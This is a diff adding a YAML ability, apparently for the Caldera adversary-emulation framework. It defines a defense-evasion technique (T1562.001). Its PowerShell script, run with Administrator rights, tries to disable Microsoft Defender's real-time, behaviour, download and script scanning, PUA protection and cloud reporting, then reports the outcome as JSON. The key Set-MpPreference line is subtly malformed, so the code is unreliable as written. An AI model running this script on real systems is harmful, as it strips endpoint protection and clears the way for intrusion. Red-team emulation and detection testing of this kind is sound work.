@@ -1,0 +1,46 @@
+# UUID: f0a1b2c3-d4e5-4f6a-8b7c-0d1e2f3a4b5d
+id: f0a1b2c3-d4e5-4f6a-8b7c-0d1e2f3a4b5d
+name: Attempt to Disable Microsoft Defender (PowerShell)
+description: Attempts to disable various Microsoft Defender features using Set-MpPreference. Success depends on Tamper Protection and privileges.
+tactic: defense-evasion
+technique_id: T1562.001 # Impair Defenses: Disable or Modify Tools
+privilege: Administrator
+platforms:
+  windows:
+    psh:
+      command: |
+        $ErrorActionPreference = "SilentlyContinue"
+        $results = @{}
+        $mpComputerStatus = Get-MpComputerStatus
+        $results.Initial_IsTamperProtected = $mpComputerStatus.IsTamperProtected
+        $results.Initial_RealTimeProtectionEnabled = $mpComputerStatus.RealTimeProtectionEnabled
+
+        $preferencesToDisable = @{
+            "DisableRealtimeMonitoring" = $true;
+            "DisableBehaviorMonitoring" = $true;
+            "DisableIOAVProtection" = $true; # On Access Protection (downloads, attachments)
+            "DisableScriptScanning" = $true;
+            "PUAProtection" = 0; # 0 for Disabled, 1 for Enabled, 2 for AuditMode
+            "SubmitSamplesConsent" = 2; # 2 for Never Send
+            "MAPSReporting" = 0 # 0 for Disabled
+        }
+        foreach ($pref in $preferencesToDisable.GetEnumerator()) {
+            try {
+                Set-MpPreference - $($pref.Name) $($pref.Value) -ErrorAction Stop
+                $results."$($pref.Name)_SetTo_$($pref.Value)" = "Attempted successfully"
+            } catch {
+                $results."$($pref.Name)_SetTo_$($pref.Value)" = "Failed: $($_.Exception.Message)"
+            }
+        }
+        $mpComputerStatusAfter = Get-MpComputerStatus
+        $results.Final_IsTamperProtected = $mpComputerStatusAfter.IsTamperProtected
+        $results.Final_RealTimeProtectionEnabled = $mpComputerStatusAfter.RealTimeProtectionEnabled
+        $results | ConvertTo-Json -Compress
+      parsers:
+        plugins.stockpile.app.parsers.json: # Use a JSON parser
+          - source: defender.tamperprotection.status
+            edge: HasStatus
+            json_key: Initial_IsTamperProtected
+          - source: defender.realtime.status
+            edge: HasStatus
+            json_key: Final_RealTimeProtectionEnabled
